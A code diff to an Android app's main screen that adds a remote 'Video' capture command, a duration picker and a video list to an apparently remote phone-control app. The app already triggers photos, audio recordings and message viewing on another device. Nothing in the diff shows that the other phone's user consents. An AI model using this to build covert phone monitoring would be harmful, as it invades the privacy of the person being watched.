@@ -268,7 +268,8 @@ class MainActivity : AppCompatActivity(), AjBus.Listener {
             box.addView(row(
                 btn("📷 Back") { cmd(d, "photo_back") },
                 btn("🤳 Front") { cmd(d, "photo_front") },
-                btn("🎙 Audio") { pickDuration(d, "Audio") { sec -> cmd(d, "record", JSONObject().put("sec", sec)) } }
+                btn("🎙 Audio") { pickDuration(d, "Audio") { sec -> cmd(d, "record", JSONObject().put("sec", sec)) } },
+                btn("🎥 Video") { pickVideoDuration(d) { sec -> cmd(d, "video", JSONObject().put("sec", sec)) } }
             ))
             box.addView(row(
                 btn("💬 Messages") { openMessages(d) },
@@ -335,15 +336,20 @@ class MainActivity : AppCompatActivity(), AjBus.Listener {
                     return@runOnUiThread
                 }
                 val photos = list.filter { it.kind == "photo" }
+                val videos = list.filter { it.kind == "video" }
                 val audios = list.filter { it.kind == "audio" }
-                if (photos.isEmpty() && audios.isEmpty()) {
-                    box.addView(dim("Nothing yet. Ask this phone for a 📷 photo or 🎙 recording, wait a few seconds, then reopen this."))
+                if (photos.isEmpty() && videos.isEmpty() && audios.isEmpty()) {
+                    box.addView(dim("Nothing yet. Ask this phone for a 📷 photo, 🎥 video or 🎙 recording, wait a few seconds, then reopen this."))
                     return@runOnUiThread
                 }
 
                 box.addView(head("📷 Photos (${photos.size})"))
                 if (photos.isEmpty()) box.addView(dim("No photos yet."))
                 photos.forEach { box.addView(photoBlock(it)) }
+
+                box.addView(head("🎥 Videos (${videos.size})"))
+                if (videos.isEmpty()) box.addView(dim("No videos yet."))
+                videos.forEach { box.addView(videoRow(it)) }
 
                 box.addView(head("🎙 Recordings (${audios.size})"))
                 if (audios.isEmpty()) box.addView(dim("No recordings yet."))
@@ -378,6 +384,23 @@ class MainActivity : AppCompatActivity(), AjBus.Listener {
                 else note.text = "Could not load this image"
             }
         }.start()
+        return wrap
+    }
+
+    private fun videoRow(m: DeviceSync.Media): View {
+        val wrap = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setBackgroundResource(R.drawable.bg_card)
+            setPadding(dp(14), dp(10), dp(14), dp(10))
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { topMargin = dp(8) }
+        }
+        wrap.addView(line("🎥 Video  •  ${timeLabel(m.timeMillis)}"))
+        wrap.addView(btnWide("▶ Play / download") {
+            toast("Loading…")
+            Thread { val u = MediaUpload.sign(this, m.path); runOnUiThread { if (u != null) openUrl(u) else toast("Could not load") } }.start()
+        })
         return wrap
     }
 
@@ -436,6 +459,19 @@ class MainActivity : AppCompatActivity(), AjBus.Listener {
             val m = inp.text.toString().trim().toIntOrNull()
             if (m == null || m < 1) toast("Enter minutes") else { cb(m * 60); dialog.dismiss() }
         })
+        dialog.show()
+    }
+
+    private fun pickVideoDuration(d: DeviceSync.Device, cb: (Int) -> Unit) {
+        val box = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(18), dp(8), dp(18), 0) }
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Video — how long? (max 3 min)")
+            .setView(ScrollView(this).apply { addView(box) })
+            .setNegativeButton("Cancel", null)
+            .create()
+        listOf("15 sec" to 15, "30 sec" to 30, "1 min" to 60, "2 min" to 120, "3 min" to 180).forEach { (label, sec) ->
+            box.addView(btnWide(label) { cb(sec); dialog.dismiss() })
+        }
         dialog.show()
     }
 
